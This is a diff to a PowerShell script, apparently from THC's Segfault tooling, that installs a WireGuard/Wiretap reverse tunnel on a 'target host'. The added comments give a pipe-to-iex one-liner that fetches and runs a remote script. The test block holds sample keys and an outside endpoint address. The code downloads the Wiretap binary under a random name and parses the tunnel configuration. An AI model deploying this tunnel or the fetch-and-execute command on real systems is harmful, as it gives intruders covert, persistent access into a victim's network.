@@ -1,8 +1,22 @@
-# # For testing ....
+# This script sets a WireGuard or Wiretap reverse tunnel on a target host.
+# The X= configuration is supplied by 'curl sf/net/up'. Thereafter:
+# $env:X=<VERSION>-<PRIV>-<PUB>-<ENDPOINT>-<ALLOWED_IPS>
+# irm https://thc.org/sfwg.ps1 | iex
+
+# Variables:
+#
+# $env:DEBUG=1                 Enable debug information and start WT in the foreground
+
+# Test IPv6:
+# curl -I 'http://[2606:4700:4700::1111]'
+# ping6 2606:4700:4700::1111
+
+
+# For testing ....
 # $env:X='1-QCM/uHtxKqfGaiascAnP3UNVlO5fa2FeotsFBv15mEs='
 # $env:X+='-cDZxMltJHcVjY+VKcHDpo17ooYBBwkMq6ebZ0R0ZzFs='
 # $env:X+='-136.243.39.18:47007-172.16.0.x/16,fd:16::x/104'
-# $env:DEBUG=""
+# $env:DEBUG=1
 
 $GITHUB_REPO="https://api.github.com/repos/sandialabs/wiretap/releases/latest"
 $WT_BIN_NAME="wiretap.exe"
@@ -146,19 +160,17 @@ function Parse-Config
         Print-Fatal "X= does not contain a valid public key."
     }
 
-    $SF_VER=($CONF[0] -match '//[^0-9]')
-    $PRIV=$CONF[1]
-    $PEER=$CONF[2]
-    $EP=$CONF[3]
-
     try{
-        if ($SF_VER -gt 0) {
-            Print-Fatal "X= contains a bad version number."
-        }
+        $CONF[0] -match '[0-9]' >$null
+        $SF_VER=($Matches[0] -as [int])
+        Print-Debug "SF_VER: $SF_VER"
     }catch{
         Print-Fatal "X= contains a bad version number."
     }
 
+    $PRIV=$CONF[1]
+    $PEER=$CONF[2]
+    $EP=$CONF[3]
 
     ### SF < 0.4.7 compatible
     $env:ADDRESS="192.168.0.1/32"
@@ -183,7 +195,7 @@ function Parse-Config
     Print-Debug "PEER_ADDRES: $env:PEER_ADDRES"
     Print-Debug "PEER_ADDRES6: $env:PEER_ADDRES6"
 
-
+    
     if ($SF_VER -eq 1) {
         Set-Item -Path Env:WIRETAP_INTERFACE_PRIVATEKEY -Value $PRIV
         Set-Item -Path Env:WIRETAP_PEER_PUBLICKEY -Value $PEER
@@ -238,7 +250,6 @@ try {
 try {
     Print-Progress "Unpacking binaries"
     Expand-Archive -Path (Join-Path -Path $WT_PATH -ChildPath "$RAND_NAME.zip") -DestinationPath "$WT_PATH"
-    # tar zx -C "$WT_PATH" -f (Join-Path -Path $WT_PATH -ChildPath "$RAND_NAME.tar.gz") 2>$null
     Print-Ok
 }catch{
     Print-Fail
